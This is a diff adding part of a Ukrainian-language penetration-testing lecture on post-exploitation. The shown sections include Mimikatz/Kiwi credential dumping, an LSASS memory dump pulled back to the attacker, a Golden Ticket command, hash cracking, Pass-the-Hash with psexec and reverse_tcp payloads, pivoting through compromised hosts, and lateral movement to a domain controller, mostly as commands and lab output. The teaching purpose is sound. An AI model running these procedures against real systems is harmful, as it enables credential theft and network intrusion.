+$ cat /etc/crontab               # Cron jobs
+$ ls -la /etc/shadow              # Чи читаємий shadow?
+$ uname -a                        # Версія ядра</code></pre>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 9.7 Credential harvesting та хеш-дампінг                     -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>9.7 Credential Harvesting та хеш-дампінг</h2>
+
+        <p>Збір облікових даних — одна з ключових цілей пост-експлуатації. Отримані хеші та паролі використовуються для латерального руху (Pass-the-Hash), ескалації привілеїв та доступу до інших систем.</p>
+
+        <h3>Дампінг хешів паролів (Windows)</h3>
+        <pre><code># hashdump — дамп SAM database (потрібні SYSTEM привілеї)
+meterpreter&gt; hashdump
+
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+jsmith:1001:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
+dbadmin:1002:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
+
+# Формат: username:RID:LM_hash:NTLM_hash:::
+# LM hash "aad3b435..." = пустий (LM disabled)
+# NTLM hash "31d6cfe0..." = пустий пароль</code></pre>
+
+        <h3>Mimikatz / Kiwi Extension</h3>
+
+        <p>Mimikatz (автор Benjamin Delpy) — найпотужніший інструмент для вилучення облікових даних Windows. У Meterpreter доступний як розширення <strong>Kiwi</strong>.</p>
+
+        <pre><code># Завантаження Kiwi (потрібні SYSTEM привілеї)
+meterpreter&gt; load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0
+ .## ^ ##.  "A La Vie, A L'Amour"
+ ## / \ ##  /* Benjamin DELPY `gentilkiwi`
+ ## \ / ##   &gt; https://blog.gentilkiwi.com
+ '## v ##'
+  '#####'                                 Success.
+
+# Дамп паролів з пам'яті (LSASS)
+meterpreter&gt; creds_all
+
+[+] Running as SYSTEM
+[*] Retrieving all credentials
+
+msv credentials
+===============
+Username    Domain   NTLM                              SHA1
+--------    ------   ----                              ----
+jsmith      CORP     64f12cddaa88057e06a81b54e73b949b  a4b...
+Administrator CORP   e02bc503339d51f71d913c245d35b50b  c5e...
+
+wdigest credentials
+===================
+Username    Domain   Password
+--------    ------   --------
+jsmith      CORP     Summer2024!
+Administrator CORP   (null)
+
+kerberos credentials
+====================
+Username    Domain        Password
+--------    ------        --------
+jsmith      CORP.LOCAL    Summer2024!
+krbtgt      CORP.LOCAL    (null)
+
+# Окремі команди Kiwi
+meterpreter&gt; creds_msv         # NTLM хеші
+meterpreter&gt; creds_wdigest     # WDigest паролі (plaintext на старих ОС)
+meterpreter&gt; creds_kerberos    # Kerberos тікети
+meterpreter&gt; creds_tspkg       # TSPKG credentials
+
+# Дамп Kerberos тікетів
+meterpreter&gt; kiwi_cmd "sekurlsa::tickets /export"
+
+# Golden Ticket (потрібен хеш krbtgt)
+meterpreter&gt; kiwi_cmd "kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-... /krbtgt:HASH /ticket:golden.kirbi"</code></pre>
+
+        <h3>Дамп LSASS-процесу</h3>
+        <pre><code># Дамп LSASS для офлайн-аналізу (альтернатива Kiwi)
+meterpreter&gt; run post/windows/gather/lsa_secrets
+
+# Або через procdump (Sysinternals)
+meterpreter&gt; upload /tmp/procdump.exe C:\\Windows\\Temp\\procdump.exe
+meterpreter&gt; execute -f "C:\\Windows\\Temp\\procdump.exe" -a "-accepteula -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp"
+meterpreter&gt; download C:\\Windows\\Temp\\lsass.dmp
+
+# Аналіз на атакуючій машині
+$ mimikatz
+mimikatz# sekurlsa::minidump lsass.dmp
+mimikatz# sekurlsa::logonPasswords full</code></pre>
+
+        <h3>Крекінг хешів</h3>
+        <pre><code># Hashcat — GPU brute force
+hashcat -m 1000 ntlm_hashes.txt /usr/share/wordlists/rockyou.txt
+# -m 1000 = NTLM
+
+# John the Ripper
+john --format=NT ntlm_hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
+
+# Онлайн бази (rainbow tables)
+# crackstation.net — безкоштовний lookup для хешів</code></pre>
+
+        <h3>Збір паролів з інших джерел</h3>
+        <table>
+          <tr>
+            <th>Модуль</th>
+            <th>Джерело</th>
+            <th>Що збирає</th>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/credentials/credential_collector</code></td>
+            <td>Windows Credential Manager</td>
+            <td>Збережені паролі Windows</td>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/enum_chrome</code></td>
+            <td>Google Chrome</td>
+            <td>Збережені паролі, cookies</td>
+          </tr>
+          <tr>
+            <td><code>post/multi/gather/firefox_creds</code></td>
+            <td>Firefox</td>
+            <td>Збережені паролі</td>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/credentials/windows_autologin</code></td>
+            <td>Registry AutoLogon</td>
+            <td>Plaintext пароль автологіну</td>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/credentials/vnc</code></td>
+            <td>VNC</td>
+            <td>VNC паролі</td>
+          </tr>
+          <tr>
+            <td><code>post/windows/gather/credentials/gpp</code></td>
+            <td>Group Policy Preferences</td>
+            <td>Паролі з GPP XML (MS14-025)</td>
+          </tr>
+          <tr>
+            <td><code>post/linux/gather/hashdump</code></td>
+            <td>/etc/shadow</td>
+            <td>Linux password hashes</td>
+          </tr>
+          <tr>
+            <td><code>post/linux/gather/enum_psk</code></td>
+            <td>NetworkManager</td>
+            <td>WiFi паролі</td>
+          </tr>
+        </table>
+
+        <h3>Pass-the-Hash (PtH)</h3>
+
+        <p>Pass-the-Hash — техніка автентифікації за допомогою NTLM-хеша без знання пароля. Працює через протокол NTLM, який використовує хеш, а не пароль.</p>
+
+        <pre><code># Pass-the-Hash через Metasploit
+msf6&gt; use exploit/windows/smb/psexec
+msf6 exploit(psexec)&gt; set RHOSTS 10.0.0.10
+msf6 exploit(psexec)&gt; set SMBUser Administrator
+msf6 exploit(psexec)&gt; set SMBPass aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b
+msf6 exploit(psexec)&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf6 exploit(psexec)&gt; exploit
+
+# Або через pth-winexe (Kali)
+$ pth-winexe -U 'Administrator%aad3b435:e02bc503' //10.0.0.10 cmd.exe
+
+# CrackMapExec
+$ crackmapexec smb 10.0.0.0/24 -u Administrator -H e02bc503339d51f71d913c245d35b50b</code></pre>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 9.8 Pivoting та латеральний рух                              -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>9.8 Pivoting та латеральний рух</h2>
+
+        <p>Pivoting — використання скомпрометованої машини як "точки опори" для доступу до інших мереж та систем, що недоступні напряму з атакуючої машини. Це ключова техніка для проникнення у внутрішні сегменти корпоративної мережі.</p>
+
+        <h3>Сценарій Pivoting</h3>
+        <pre><code># Типова ситуація:
+# Атакуючий: 192.168.1.50 (Kali)
+# Жертва 1: 192.168.1.100 (зовнішній інтерфейс)
+#            10.0.0.5       (внутрішній інтерфейс)
+# Ціль 2:   10.0.0.10     (тільки внутрішня мережа — DC, БД тощо)
+
+# Атакуючий НЕ може напряму досягти 10.0.0.10
+# Але може використати Жертву 1 як "pivot point"</code></pre>
+
+        <h3>Метод 1: Autoroute (маршрутизація через Metasploit)</h3>
+        <pre><code># Додати маршрут через сесію Meterpreter
+meterpreter&gt; run autoroute -s 10.0.0.0/24
+
+[*] Adding a route to 10.0.0.0/255.255.255.0...
+[+] Added route to 10.0.0.0/24 via 192.168.1.100
+
+# Або через post-модуль
+meterpreter&gt; run post/multi/manage/autoroute
+
+# Перевірка маршрутів
+meterpreter&gt; background
+msf6&gt; route print
+
+IPv4 Active Routing Table
+=========================
+   Subnet             Netmask            Gateway
+   ------             -------            -------
+   10.0.0.0           255.255.255.0      Session 1
+
+# Тепер Metasploit може сканувати 10.0.0.0/24 через Session 1
+msf6&gt; use auxiliary/scanner/portscan/tcp
+msf6 auxiliary(tcp)&gt; set RHOSTS 10.0.0.10
+msf6 auxiliary(tcp)&gt; set PORTS 22,80,135,139,445,3389
+msf6 auxiliary(tcp)&gt; run
+
+[+] 10.0.0.10:445 - TCP OPEN
+[+] 10.0.0.10:3389 - TCP OPEN</code></pre>
+
+        <h3>Метод 2: Port Forwarding (portfwd)</h3>
+        <pre><code># Local port forward — доступ до порту на внутрішній машині
+# Формат: portfwd add -l LOCAL_PORT -p REMOTE_PORT -r REMOTE_HOST
+
+# Прокинути RDP (3389) внутрішньої машини на локальний порт
+meterpreter&gt; portfwd add -l 3389 -p 3389 -r 10.0.0.10
+[*] Local TCP relay created: :3389 &lt;-&gt; 10.0.0.10:3389
+
+# Тепер підключаємося з Kali до localhost:3389
+$ xfreerdp /u:Administrator /v:127.0.0.1:3389
+
+# Прокинути веб-сервер
+meterpreter&gt; portfwd add -l 8080 -p 80 -r 10.0.0.10
+# Відкрити http://127.0.0.1:8080 у браузері
+
+# Прокинути базу даних
+meterpreter&gt; portfwd add -l 3306 -p 3306 -r 10.0.0.20
+# mysql -h 127.0.0.1 -P 3306 -u root -p
+
+# Reverse port forward (жертва підключається назад)
+meterpreter&gt; portfwd add -R -l 8443 -p 8443 -L 192.168.1.50
+
+# Список активних port forward'ів
+meterpreter&gt; portfwd list
+
+# Видалити port forward
+meterpreter&gt; portfwd delete -l 3389 -p 3389 -r 10.0.0.10
+meterpreter&gt; portfwd flush   # видалити всі</code></pre>
+
+        <h3>Метод 3: SOCKS Proxy</h3>
+        <pre><code># Запуск SOCKS4a proxy через Metasploit
+msf6&gt; use auxiliary/server/socks_proxy
+msf6 auxiliary(socks_proxy)&gt; set SRVPORT 1080
+msf6 auxiliary(socks_proxy)&gt; set VERSION 4a
+msf6 auxiliary(socks_proxy)&gt; run -j
+
+[*] Starting the SOCKS proxy server on 0.0.0.0:1080
+
+# Налаштування proxychains (/etc/proxychains4.conf)
+# Додати в кінець:
+socks4 127.0.0.1 1080
+
+# Тепер будь-який інструмент може працювати через pivot
+$ proxychains nmap -sT -Pn -p 22,80,445,3389 10.0.0.10
+$ proxychains curl http://10.0.0.10
+$ proxychains ssh admin@10.0.0.10
+$ proxychains crackmapexec smb 10.0.0.0/24</code></pre>
+
+        <h3>Латеральний рух (Lateral Movement)</h3>
+
+        <p>Після збору credentials та налаштування pivoting'у — переміщення на інші машини:</p>
+
+        <table>
+          <tr>
+            <th>Техніка</th>
+            <th>Протокол</th>
+            <th>Інструмент</th>
+            <th>Потрібно</th>
+          </tr>
+          <tr>
+            <td><strong>PsExec</strong></td>
+            <td>SMB (445)</td>
+            <td>Metasploit, Sysinternals</td>
+            <td>Admin + пароль або хеш</td>
+          </tr>
+          <tr>
+            <td><strong>WMI</strong></td>
+            <td>WMI (135)</td>
+            <td>wmiexec.py, Metasploit</td>
+            <td>Admin credentials</td>
+          </tr>
+          <tr>
+            <td><strong>WinRM</strong></td>
+            <td>HTTP (5985/5986)</td>
+            <td>evil-winrm, PowerShell</td>
+            <td>Admin credentials</td>
+          </tr>
+          <tr>
+            <td><strong>RDP</strong></td>
+            <td>RDP (3389)</td>
+            <td>xfreerdp, rdesktop</td>
+            <td>Valid credentials</td>
+          </tr>
+          <tr>
+            <td><strong>SSH</strong></td>
+            <td>SSH (22)</td>
+            <td>ssh, Metasploit</td>
+            <td>Credentials або ключі</td>
+          </tr>
+          <tr>
+            <td><strong>Pass-the-Hash</strong></td>
+            <td>NTLM</td>
+            <td>CrackMapExec, pth-winexe</td>
+            <td>NTLM hash</td>
+          </tr>
+          <tr>
+            <td><strong>Pass-the-Ticket</strong></td>
+            <td>Kerberos</td>
+            <td>Mimikatz, Rubeus</td>
+            <td>Kerberos TGT/TGS</td>
+          </tr>
+        </table>
+
+        <pre><code># Приклад: Lateral Movement через PsExec на внутрішню машину
+msf6&gt; use exploit/windows/smb/psexec
+msf6 exploit(psexec)&gt; set RHOSTS 10.0.0.10
+msf6 exploit(psexec)&gt; set SMBUser Administrator
+msf6 exploit(psexec)&gt; set SMBPass Summer2024!
+msf6 exploit(psexec)&gt; set PAYLOAD windows/x64/meterpreter/bind_tcp
+msf6 exploit(psexec)&gt; exploit
+
+[*] Meterpreter session 2 opened (10.0.0.5:49999 -&gt; 10.0.0.10:4444)
+
+meterpreter&gt; sysinfo
+Computer : DC01
+OS       : Windows Server 2019
+Domain   : CORP
+
+# Тепер маємо доступ до Domain Controller!</code></pre>
+
+        <h3>Управління множинними сесіями</h3>
+        <pre><code># Список активних сесій
+msf6&gt; sessions -l
+
+Active sessions
+===============
+  Id  Name  Type                     Connection
+  --  ----  ----                     ----------
+  1         meterpreter x64/windows  192.168.1.50:4444 -&gt; 192.168.1.100:49872
+  2         meterpreter x64/windows  10.0.0.5:49999 -&gt; 10.0.0.10:4444
+
+# Перемикання між сесіями
+msf6&gt; sessions -i 2
+[*] Starting interaction with 2...
+meterpreter&gt;
+
+# Виконання команди на всіх сесіях одночасно
+msf6&gt; sessions -C "sysinfo" -i all</code></pre>
       </section>
 
     </article>
 
     <div class="lecture-nav-bottom">
-      <a href="../lectures/8.html" class="nav-btn">&larr; Попередня</a>
-      <a href="../lectures/10.html" class="nav-btn">Наступна &rarr;</a>
+      <a href="8.html" class="nav-btn">&larr; Попередня</a>
+      <a href="10.html" class="nav-btn">Наступна &rarr;</a>
     </div>
 
     <footer id="site-footer"></footer>
